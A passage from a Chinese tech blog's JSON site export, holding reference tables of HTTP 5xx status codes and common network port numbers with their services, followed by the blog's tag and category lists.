服务器不支持请求的功能，无法完成请求 502 Bad Gateway 充当网关或代理的服务器，从远端服务器接收到了一个无效的请求 503 Service Unavailable 由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中 504 Gateway Time-out 充当网关或代理的服务器，未及时从远端服务器获取请求 505 HTTP Version not supported 服务器不支持请求的HTTP协议的版本，无法完成处理 P3、常见端口号参照表 端口号码 / 层 名称 注释 1 tcpmux TCP 端口服务多路复用 5 rje 远程作业入口 7 echo Echo 服务 9 discard 用于连接测试的空服务 11 systat 用于列举连接了的端口的系统状态 13 daytime 给请求主机发送日期和时间 17 qotd 给连接了的主机发送每日格言 18 msp 消息发送协议 19 chargen 字符生成服务；发送无止境的字符流 20 ftp-data FTP 数据端口 21 ftp 文件传输协议（FTP）端口；有时被文件服务协议（FSP）使用 22 ssh 安全 Shell（SSH）服务 23 telnet Telnet 服务 25 smtp 简单邮件传输协议（SMTP） 37 time 时间协议 39 rlp 资源定位协议 42 nameserver 互联网名称服务 43 nicname WHOIS 目录服务 49 tacacs 用于基于 TCP/IP 验证和访问的终端访问控制器访问控制系统 50 re-mail-ck 远程邮件检查协议 53 domain 域名服务（如 BIND） 63 whois++ WHOIS++，被扩展了的 WHOIS 服务 67 bootps 引导协议（BOOTP）服务；还被动态主机配置协议（DHCP）服务使用 68 bootpc Bootstrap（BOOTP）客户；还被动态主机配置协议（DHCP）客户使用 69 tftp 小文件传输协议（TFTP） 70 gopher Gopher 互联网文档搜寻和检索 71 netrjs-1 远程作业服务 72 netrjs-2 远程作业服务 73 netrjs-3 远程作业服务 73 netrjs-4 远程作业服务 79 finger 用于用户联系信息的 Finger 服务 80 http 用于万维网（WWW）服务的超文本传输协议（HTTP） 88 kerberos Kerberos 网络验证系统 95 supdup Telnet 协议扩展 101 hostname SRI-NIC 机器上的主机名服务 102 iso-tsap ISO 开发环境（ISODE）网络应用 105 csnet-ns 邮箱名称服务器；也被 CSO 名称服务器使用 107 rtelnet 远程 Telnet 109 pop2 邮局协议版本2 110 pop3 邮局协议版本3 111 sunrpc 用于远程命令执行的远程过程调用（RPC）协议，被网络文件系统（NFS）使用 113 auth 验证和身份识别协议 115 sftp 安全文件传输协议（SFTP）服务 117 uucp-path Unix 到 Unix 复制协议（UUCP）路径服务 119 nntp 用于 USENET 讨论系统的网络新闻传输协议（NNTP） 123 ntp 网络时间协议（NTP） 137 netbios-ns 在红帽企业 Linux 中被 Samba 使用的 NETBIOS 名称服务 138 netbios-dgm 在红帽企业 Linux 中被 Samba 使用的 NETBIOS 数据报服务 139 netbios-ssn 在红帽企业 Linux 中被 Samba 使用的NET BIOS 会话服务 143 imap 互联网消息存取协议（IMAP） 161 snmp 简单网络管理协议（SNMP） 162 snmptrap SNMP 的陷阱 163 cmip-man 通用管理信息协议（CMIP） 164 cmip-agent 通用管理信息协议（CMIP） 174 mailq MAILQ 177 xdmcp X 显示管理器控制协议 178 nextstep NeXTStep 窗口服务器 179 bgp 边界网络协议 191 prospero Cliffod Neuman 的 Prospero 服务 194 irc 互联网中继聊天（IRC） 199 smux SNMP UNIX 多路复用 201 at-rtmp AppleTalk 选路 202 at-nbp AppleTalk 名称绑定 204 at-echo AppleTalk echo 服务 206 at-zis AppleTalk 区块信息 209 qmtp 快速邮件传输协议（QMTP） 210 z39.50 NISO Z39.50 数据库 213 ipx 互联网络分组交换协议（IPX），被 Novell Netware 环境常用的数据报协议 220 imap3 互联网消息存取协议版本3 245 link LINK 347 fatserv Fatmen 服务器 363 rsvp_tunnel RSVP 隧道 369 rpc2portmap Coda 文件系统端口映射器 370 codaauth2 Coda 文件系统验证服务 372 ulistproc UNIX Listserv 389 ldap 轻型目录存取协议（LDAP） 427 svrloc 服务位置协议（SLP） 434 mobileip-agent 可移互联网协议（IP）代理 435 mobilip-mn 可移互联网协议（IP）管理器 443 https 安全超文本传输协议（HTTP） 444 snpp 小型网络分页协议 445 microsoft-ds 通过 TCP/IP 的服务器消息块（SMB） 464 kpasswd Kerberos 口令和钥匙改换服务 468 photuris Photuris 会话钥匙管理协议 487 saft 简单不对称文件传输（SAFT）协议 488 gss-http 用于 HTTP 的通用安全服务（GSS） 496 pim-rp-disc 用于协议独立的多址传播（PIM）服务的会合点发现（RP-DISC） 500 isakmp 互联网安全关联和钥匙管理协议（ISAKMP） 535 iiop 互联网内部对象请求代理协议（IIOP） 538 gdomap GNUstep 分布式对象映射器（GDOMAP） 546 dhcpv6-client 动态主机配置协议（DHCP）版本6客户 547 dhcpv6-server 动态主机配置协议（DHCP）版本6服务 554 rtsp 实时流播协议（RTSP） 563 nntps 通过安全套接字层的网络新闻传输协议（NNTPS） 565 whoami whoami 587 submission 邮件消息提交代理（MSA） 610 npmp-local 网络外设管理协议（NPMP）本地 / 分布式排队系统（DQS） 611 npmp-gui 网络外设管理协议（NPMP）GUI / 分布式排队系统（DQS） 612 hmmp-ind HMMP 指示 / DQS 631 ipp 互联网打印协议（IPP） 636 ldaps 通过安全套接字层的轻型目录访问协议（LDAPS） 674 acap 应用程序配置存取协议（ACAP） 694 ha-cluster 用于带有高可用性的群集的心跳服务 749 kerberos-adm Kerberos 版本5（v5）的“kadmin”数据库管理 750 kerberos-iv Kerberos 版本4（v4）服务 765 webster 网络词典 767 phonebook 网络电话簿 873 rsync rsync 文件传输服务 992 telnets 通过安全套接字层的 Telnet（TelnetS） 993 imaps 通过安全套接字层的互联网消息存取协议（IMAPS） 994 ircs 通过安全套接字层的互联网中继聊天（IRCS） 995 pop3s 通过安全套接字层的邮局协议版本3（POPS3）","link":"2019/03/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B-%E5%BA%94%E7%94%A8%E5%B1%82%E5%8F%8A%E4%B9%A6%E5%90%8E%E5%A5%97%E6%8E%A5%E5%AD%97%E7%BC%96%E7%A8%8B%E7%BB%83%E4%B9%A0%E5%8F%82%E8%80%83/"}],"tags":[{"name":"密码学","slug":"密码学","link":"tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"Android","slug":"Android","link":"tags/Android/"},{"name":"CTF","slug":"CTF","link":"tags/CTF/"},{"name":"Web","slug":"Web","link":"tags/Web/"},{"name":"CRC","slug":"CRC","link":"tags/CRC/"},{"name":"栈帧","slug":"栈帧","link":"tags/%E6%A0%88%E5%B8%A7/"},{"name":"存储器层次结构","slug":"存储器层次结构","link":"tags/%E5%AD%98%E5%82%A8%E5%99%A8%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84/"},{"name":"异常控制流&&进程","slug":"异常控制流-进程","link":"tags/%E5%BC%82%E5%B8%B8%E6%8E%A7%E5%88%B6%E6%B5%81-%E8%BF%9B%E7%A8%8B/"},{"name":"汇编","slug":"汇编","link":"tags/%E6%B1%87%E7%BC%96/"},{"name":"链接","slug":"链接","link":"tags/%E9%93%BE%E6%8E%A5/"},{"name":"AWD","slug":"AWD","link":"tags/AWD/"},{"name":"Java","slug":"Java","link":"tags/Java/"},{"name":"KMP","slug":"KMP","link":"tags/KMP/"},{"name":"PHP","slug":"PHP","link":"tags/PHP/"},{"name":"Python","slug":"Python","link":"tags/Python/"},{"name":"Qt","slug":"Qt","link":"tags/Qt/"},{"name":"RSA","slug":"RSA","link":"tags/RSA/"},{"name":"Redis","slug":"Redis","link":"tags/Redis/"},{"name":"DES","slug":"DES","link":"tags/DES/"},{"name":"crypto","slug":"crypto","link":"tags/crypto/"},{"name":"Spring Boot","slug":"Spring-Boot","link":"tags/Spring-Boot/"},{"name":"Vue","slug":"Vue","link":"tags/Vue/"},{"name":"Wireshark","slug":"Wireshark","link":"tags/Wireshark/"},{"name":"XXE","slug":"XXE","link":"tags/XXE/"},{"name":"jwt","slug":"jwt","link":"tags/jwt/"},{"name":"PHP-Injection","slug":"PHP-Injection","link":"tags/PHP-Injection/"},{"name":"PostgreSql","slug":"PostgreSql","link":"tags/PostgreSql/"},{"name":"Pwn","slug":"Pwn","link":"tags/Pwn/"},{"name":"python3","slug":"python3","link":"tags/python3/"},{"name":"多线程","slug":"多线程","link":"tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"name":"webshell","slug":"webshell","link":"tags/webshell/"},{"name":"Docker","slug":"Docker","link":"tags/Docker/"},{"name":"渗透","slug":"渗透","link":"tags/%E6%B8%97%E9%80%8F/"},{"name":"画画","slug":"画画","link":"tags/%E7%94%BB%E7%94%BB/"},{"name":"导航栏","slug":"导航栏","link":"tags/%E5%AF%BC%E8%88%AA%E6%A0%8F/"},{"name":"Linux","slug":"Linux","link":"tags/Linux/"},{"name":"随机数","slug":"随机数","link":"tags/%E9%9A%8F%E6%9C%BA%E6%95%B0/"},{"name":"验证码","slug":"验证码","link":"tags/%E9%AA%8C%E8%AF%81%E7%A0%81/"},{"name":"进制转换","slug":"进制转换","link":"tags/%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2/"},{"name":"换源","slug":"换源","link":"tags/%E6%8D%A2%E6%BA%90/"},{"name":"进程&&线程","slug":"进程-线程","link":"tags/%E8%BF%9B%E7%A8%8B-%E7%BA%BF%E7%A8%8B/"},{"name":"数据结构","slug":"数据结构","link":"tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"name":"Asuri","slug":"Asuri","link":"tags/Asuri/"},{"name":"正则表达式","slug":"正则表达式","link":"tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"开发模式","slug":"开发模式","link":"tags/%E5%BC%80%E5%8F%91%E6%A8%A1%E5%BC%8F/"},{"name":"爬虫","slug":"爬虫","link":"tags/%E7%88%AC%E8%99%AB/"},{"name":"反序列化","slug":"反序列化","link":"tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"计算机网络","slug":"计算机网络","link":"tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"},{"name":"服务器","slug":"服务器","link":"tags/%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"name":"虚拟内存","slug":"虚拟内存","link":"tags/%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/"},{"name":"python","slug":"python","link":"tags/python/"},{"name":"Sql-Injection","slug":"Sql-Injection","link":"tags/Sql-Injection/"},{"name":"Md5","slug":"Md5","link":"tags/Md5/"},{"name":"mysql","slug":"mysql","link":"tags/mysql/"},{"name":"sql","slug":"sql","link":"tags/sql/"},{"name":"网络安全法","slug":"网络安全法","link":"tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/"},{"name":"面经","slug":"面经","link":"tags/%E9%9D%A2%E7%BB%8F/"},{"name":"Upload","slug":"Upload","link":"tags/Upload/"}],"categories":[{"name":"Crypto","slug":"Crypto","link":"categories/Crypto/"},{"name":"雁儿几度恋开发-愿得一站入万家","slug":"雁儿几度恋开发-愿得一站入万家","link":"categories/%E9%9B%81%E5%84%BF%E5%87%A0%E5%BA%A6%E6%81%8B%E5%BC%80%E5%8F%91-%E6%84%BF%E5%BE%97%E4%B8%80%E7%AB%99%E5%85%A5%E4%B8%87%E5%AE%B6/"},{"name":"Pwn","slug":"Pwn","link":"categories/Pwn/"},{"name":"CSAPP","slug":"CSAPP","link":"categories/CSAPP/"},{"name":"Android","slug":"雁儿几度恋开发-愿得一站入万家/Android","link":"categories/%E9%9B%81%E5%84%BF%E5%87%A0%E5%BA%A6%E6%81%8B%E5%BC%80%E5%8F%91-%E6%84%BF%E5%BE%97%E4%B8%80%E7%AB%99%E5%85%A5%E4%B8%87%E5%AE%B6/Android/"},{"name":"Web","slug":"Web","link":"categories/Web/"},{"name":"java安全研究","slug":"java安全研究","link":"categories/java%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"},{"name":"算法","slug":"算法","link":"categories/%E7%AE%97%E6%B3%95/"},{"name":"CTF","slug":"CTF","link":"categories/CTF/"},{"name":"Misc","slug":"Misc","link":"categories/Misc/"},{"name":"Qt","slug":"雁儿几度恋开发-愿得一站入万家/Qt","link":"categories/%E9%9B%81%E5%84%BF%E5%87%A0%E5%BA%A6%E6%81%8B%E5%BC%80%E5%8F%91-%E6%84%BF%E5%BE%97%E4%B8%80%E7%AB%99%E5%85%A5%E4%B8%87%E5%AE%B6/Qt/"},{"name":"Redis","slug":"Redis","link":"categories/Redis/"},{"name":"Spring boot","slug":"雁儿几度恋开发-愿得一站入万家/Spring-boot","link":"categories/%E9%9B%81%E5%84%BF%E5%87%A0%E5%BA%A6%E6%81%8B%E5%BC%80%E5%8F%91-%E6%84%BF%E5%BE%97%E4%B8%80%E7%AB%99%E5%85%A5%E4%B8%87%E5%AE%B6/Spring-boot/"},{"name":"Vue","slug":"雁儿几度恋开发-愿得一站入万家/Vue","link":"categories/%E9%9B%81%E5%84%BF%E5%87%A0%E5%BA%A6%E6%81%8B%E5%BC%80%E5%8F%91-%E6%84%BF%E5%BE%97%E4%B8%80%E7%AB%99%E5%85%A5%E4%B8%87%E5%AE%B6/Vue/"},{"name":"Wireshark数据包分析实战","slug":"Wireshark数据包分析实战","link":"categories/Wireshark%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98/"},{"name":"Web","slug":"CTF/Web","link":"categories/CTF/Web/"},{"name":"PostgreSql内核分析","slug":"PostgreSql内核分析","link":"categories/PostgreSql%E5%86%85%E6%A0%B8%E5%88%86%E6%9E%90/"},{"name":"计算机杂七杂八","slug":"计算机杂七杂八","link":"categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"},{"name":"咪咪","slug":"咪咪","link":"categories/%E5%92%AA%E5%92%AA/"},{"name":"网络安全","slug":"网络安全","link":"categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"情感生活","slug":"情感生活","link":"categories/%E6%83%85%E6%84%9F%E7%94%9F%E6%B4%BB/"},{"name":"导航栏","slug":"导航栏","link":"categories/%E5%AF%BC%E8%88%AA%E6%A0%8F/"},{"name":"内网","slug":"内网","link":"categories/%E5%86%85%E7%BD%91/"},{"name":"Python","slug":"Python","link":"categories/Python/"},{"name":"Crypto","slug":"CTF/Crypto","link":"categories/CTF/Crypto/"},{"name":"弃燕雀之小志-慕鸿鹄以高翔","slug":"弃燕雀之小志-慕鸿鹄以高翔","link":"categories/%E5%BC%83%E7%87%95%E9%9B%80%E4%B9%8B%E5%B0%8F%E5%BF%97-%E6%85%95%E9%B8%BF%E9%B9%84%E4%BB%A5%E9%AB%98%E7%BF%94/"},{"name":"正则表达式必知必会","slug":"正则表达式必知必会","link":"categories/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A/"},{"name":"渗透","slug":"网络安全/渗透","link":"categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%B8%97%E9%80%8F/"},{"name":"开发模式","slug":"雁儿几度恋开发-愿得一站入万家/开发模式","link":"categories/%E9%9B%81%E5%84%BF%E5%87%A0%E5%BA%A6%E6%81%8B%E5%BC%80%E5%8F%91-%E6%84%BF%E5%BE%97%E4%B8%80%E7%AB%99%E5%85%A5%E4%B8%87%E5%AE%B6/%E5%BC%80%E5%8F%91%E6%A8%A1%E5%BC%8F/"},{"name":"精通Python网络爬虫","slug":"精通Python网络爬虫","link":"categories/%E7%B2%BE%E9%80%9APython%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB/"},{"name":"计算机网络自顶向下","slug":"计算机网络自顶向下","link":"categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B/"},{"name":"Web","slug":"弃燕雀之小志-慕鸿鹄以高翔/Web","link":"categories/%E5%BC%83%E7%87%95%E9%9B%80%E4%B9%8B%E5%B0%8F%E5%BF%97-%E6%85%95%E9%B8%BF%E9%B9%84%E4%BB%A5%E9%AB%98%E7%BF%94/Web/"},{"name":"Mysql必知必会","slug":"Mysql必知必会","link":"categories/Mysql%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A/"},{"name":"综合","slug":"综合","link":"categories/%E7%BB%BC%E5%90%88/"}]}